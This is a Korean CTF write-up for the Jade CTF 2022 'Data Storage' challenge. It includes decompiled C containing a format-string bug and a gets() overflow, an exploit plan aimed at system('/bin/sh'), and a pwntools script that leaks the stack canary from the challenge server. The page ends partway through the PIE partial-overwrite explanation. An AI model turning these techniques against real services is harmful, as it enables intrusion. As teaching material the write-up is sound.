<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Info(32&#x2F;630) solves descriptionIn his DBMS course, Shekhar was learning about CRUD operations. He was taught these operations in SQL, but he wanted to try them out in C. He wrote a program for re">
<meta property="og:type" content="article">
<meta property="og:title" content="Jade CTF 2022 - Data Storage (canary, pie)">
<meta property="og:url" content="https://jiravvit.github.io/jadectf2022-data_storage/index.html">
<meta property="og:site_name" content="jir4vvit">
<meta property="og:description" content="Info(32&#x2F;630) solves descriptionIn his DBMS course, Shekhar was learning about CRUD operations. He was taught these operations in SQL, but he wanted to try them out in C. He wrote a program for re">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-10-25T22:00:00.000Z">
<meta property="article:modified_time" content="2022-12-22T18:47:30.712Z">
<meta property="article:author" content="jir4vvit">
<meta property="article:tag" content="fsb">
<meta property="article:tag" content="canary">
<meta property="article:tag" content="pie">
<meta property="article:tag" content="Jade CTF">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/judi2.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
        
      
    
    <!-- title -->
    <title>Jade CTF 2022 - Data Storage (canary, pie)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/jadectf2022-roll_the_dice/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/32bit_stack_aligned/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/jadectf2022-data_storage/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/jadectf2022-data_storage/&text=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/jadectf2022-data_storage/&is_video=false&description=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Jade CTF 2022 - Data Storage (canary, pie)&body=Check out this article: https://jiravvit.github.io/jadectf2022-data_storage/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/jadectf2022-data_storage/&name=Jade CTF 2022 - Data Storage (canary, pie)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/jadectf2022-data_storage/&t=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">2.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Source Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pre-work"><span class="toc-number">3.2.</span> <span class="toc-text">pre-work</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-canary-amp-pie"><span class="toc-number">3.2.1.</span> <span class="toc-text">leak canary &amp; pie</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.3.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">3.4.</span> <span class="toc-text">Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tmi"><span class="toc-number">4.</span> <span class="toc-text">tmi</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Jade CTF 2022 - Data Storage (canary, pie)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">jir4vvit</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-10-25T22:00:00.000Z" itemprop="datePublished">2022-10-26</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Jade-CTF/" rel="tag">Jade CTF</a>, <a class="tag-link-link" href="/tags/canary/" rel="tag">canary</a>, <a class="tag-link-link" href="/tags/fsb/" rel="tag">fsb</a>, <a class="tag-link-link" href="/tags/pie/" rel="tag">pie</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(32&#x2F;630) solves</p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>In his DBMS course, Shekhar was learning about CRUD operations. He was taught these operations in SQL, but he wanted to try them out in C. He wrote a program for reading data from input, and then scrambling it so other users can’t figure out what is stored. He gave me the binary to test it, could you help me out?</p>
<p>nc 34.76.206.46 10003</p>
<h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── chall</span><br></pre></td></tr></table></figure>

<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>카나리가 있고 PIE도 있다.. </p>
<h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>코드는 간단하다. main()에서 database_store()를 호출하는데 이 함수에 취약한 부분이 존재한다. 그래서 이 함수 하나만 보면 된다.</p>
<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">database_store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> yes[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">520</span>]; <span class="comment">// [rsp+30h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+238h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you sure that you want to store data [yes/no]?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You entered: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);                                    <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIs that correct?&quot;</span>);</span><br><span class="line">  fgets(yes, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  yes[<span class="built_in">strcspn</span>(yes, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(yes, <span class="string">&quot;yes&quot;</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, it&#x27;s time to enter your details&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Note that there is a length given for each field, you have to enter atleast that many characters&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Fill it up with spaces if your input is less&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Enter your Name(%d), Admission Number(%d), Branch(%d), University(%d), and Address(%d) (in this order):\n&quot;</span>,</span><br><span class="line">    n,</span><br><span class="line">    an,</span><br><span class="line">    b,</span><br><span class="line">    u,</span><br><span class="line">    a[<span class="number">0</span>]);</span><br><span class="line">  gets(input);                                  <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Scrambling your data so that hackers can&#x27;t steal it...&quot;</span>);</span><br><span class="line">  modify(&amp;name, input, <span class="number">0LL</span>, n);</span><br><span class="line">  v1 = n;</span><br><span class="line">  modify(&amp;admno, input, n, an);</span><br><span class="line">  v2 = an + v1;</span><br><span class="line">  modify(&amp;branch, input, v2, b);</span><br><span class="line">  v3 = b + v2;</span><br><span class="line">  modify(&amp;university, input, v3, u);</span><br><span class="line">  modify(&amp;address, input, u + v3, a[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  modify(input, &amp;name, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>));</span><br><span class="line">  v4 = (<span class="type">int</span>)n / <span class="number">2</span>;</span><br><span class="line">  modify(&amp;input[(<span class="type">int</span>)n / <span class="number">2</span>], &amp;branch, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>));</span><br><span class="line">  v5 = (<span class="type">int</span>)b / <span class="number">3</span> + v4;</span><br><span class="line">  modify(&amp;input[v5], &amp;admno, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>));</span><br><span class="line">  v6 = (<span class="type">int</span>)an / <span class="number">3</span> + v5;</span><br><span class="line">  modify(&amp;input[v6], &amp;university, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>));</span><br><span class="line">  v7 = (<span class="type">int</span>)u / <span class="number">2</span> + v6;</span><br><span class="line">  modify(&amp;input[v7], &amp;address, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v8 = a[<span class="number">0</span>] / <span class="number">10</span> + v7;</span><br><span class="line">  modify(&amp;input[v8], &amp;branch, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>), b - (<span class="type">int</span>)b / <span class="number">3</span>);</span><br><span class="line">  v9 = b - (<span class="type">int</span>)b / <span class="number">3</span> + v8;</span><br><span class="line">  modify(&amp;input[v9], &amp;name, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>), n - (<span class="type">int</span>)n / <span class="number">2</span>);</span><br><span class="line">  v10 = n - (<span class="type">int</span>)n / <span class="number">2</span> + v9;</span><br><span class="line">  modify(&amp;input[v10], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v11 = a[<span class="number">0</span>] / <span class="number">10</span> + v10;</span><br><span class="line">  modify(&amp;input[v11], &amp;university, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>), (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  v12 = (<span class="type">int</span>)u / <span class="number">4</span> + v11;</span><br><span class="line">  modify(&amp;input[v12], &amp;admno, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>), an - (<span class="type">int</span>)an / <span class="number">3</span>);</span><br><span class="line">  v13 = an - (<span class="type">int</span>)an / <span class="number">3</span> + v12;</span><br><span class="line">  modify(&amp;input[v13], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)));</span><br><span class="line">  modify(</span><br><span class="line">    &amp;input[a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>) + v13],</span><br><span class="line">    &amp;university,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>),</span><br><span class="line">    u - ((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>코드가 복잡해보이지만(?) 기능 분석을 할 필요는 없다. 취약점을 찾는 것이 목표이기 때문에 필요한 부분만 읽으면 된다.</p>
<p>그러면 fsb와 bof가 대놓고 보이는 것을 찾을 수 있다.</p>
<p>fsb로 필요한 것을 leak하고 bof를 이용해서 ROP를 하면 된다. 말은 이렇게 간단하지만 익스하는데 꽤나 오래걸렸고 생각보다 스트레스를 받았었다.</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>local 기준으로 익스를 작성했는데 remote는 잘 되지 않는 문제(?)가 발생했다. (로되리안 ㅜ)</p>
<p>local과 remote의 libc가 달라서 스택에 값이 쌓이는게 달라졌다. 그래서 leak할 offset을 루프를 돌려서 찾는 과정이 추가적으로 필요하다.</p>
<p>아래부터 remote 기준으로 설명을 한다.</p>
<h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ul>
<li>사전 작업: fsb를 이용하여 canary, pie offset 찾기</li>
</ul>
<ol>
<li>canary leak하고 main으로 돌리기</li>
<li>pie leak하고 main으로 돌리기</li>
<li>got 출력해서 libc 구하기</li>
<li><code>system(&#39;/bin/sh\x00&#39;)</code>으로 흐름 돌리기</li>
</ol>
<h3 id="pre-work"><a href="#pre-work" class="headerlink" title="pre-work"></a>pre-work</h3><h4 id="leak-canary-amp-pie"><a href="#leak-canary-amp-pie" class="headerlink" title="leak canary &amp; pie"></a>leak canary &amp; pie</h4><p>canary leak을 위한 코드는 아래와 같다.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        off = off+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(off-<span class="number">1</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#log.info(hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)             <span class="comment">######## !!! ########</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>제일 먼저 해야할 일은 canary를 leak하는 것이다. offset을 찾기 위해서 루프를 돌 때 try-except을 이용해서 예외처리를 해주었다. 만약 예외가 발생한다면 다시 remote에 연결해주었는데, <code>p.close()</code>를 안해준다면 프로세스가 계속 살아있기 때문에 remote에 새로 연결해주기 전에 close를 해주어야 한다.</p>
<p>fsb를 이용해서 leak하고 유효한 주소를 가져오는 과정에서 예외가 발생할 가능성이 존재한다. 주소를 출력할 때 16진수 값이거나 <code>(nil)</code>을 출력해주는데 후자일 경우 <code>int(leak, 16)</code>에서 에러가 발생하기 때문에 except으로 가서 예외처리를 해줄 수 있다. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">invalid literal for int() with base 16: b&#x27;il)\n&#x27;</span><br><span class="line">[*] Closed connection to 34.76.206.46 port 10003</span><br></pre></td></tr></table></figure>

<p>루프가 끝나고 pause를 해줬기 때문에 멈추는 곳을 보면 바로 canary를 찾을 수 있다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">77 0x8a3ffc38e32e9500</span><br><span class="line">[*] Paused (press any to continue)</span><br></pre></td></tr></table></figure>

<p>offset은 77임을 바로 알 수 있다. </p>
<p>pause하는 조건은 주석에 <code>!!!</code>한 곳을 보면 알 수 있다. <code>]?\n</code>은 이 함수 초반에 출력하는 문자열 중 일부이다. ret를 이 함수로 돌려주었기 때문에 이것이 출력된다면 leak한 값이 canary임을 바로 확인할 수 있다.</p>
<p>사실 canary가 구해져도 바로 ret로 돌릴 수가 없다. 왜냐하면 pie base의 값이 랜덤이기 때문에 아래와 같은 base이길 기대해야한다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x561aa9000000</span><br></pre></td></tr></table></figure>

<p>내가 돌리고 싶은 주소는 <code>pie_base + 0x1578</code>인데 디버깅을 하다보면 <code>0x01578</code>이 고정인 것을 알 수 있다. 2.5바이트가 고정인데 0.5바이트만 쓸 수 없으니 2바이트만 덮을 수 있다. ret를 2바이트만 덮으면 어차피 끝에 null이 자동으로 붙기 때문에 1&#x2F;16의 확률로 내가 원하는 함수로 흐름을 돌릴 수 있게 된다.</p>
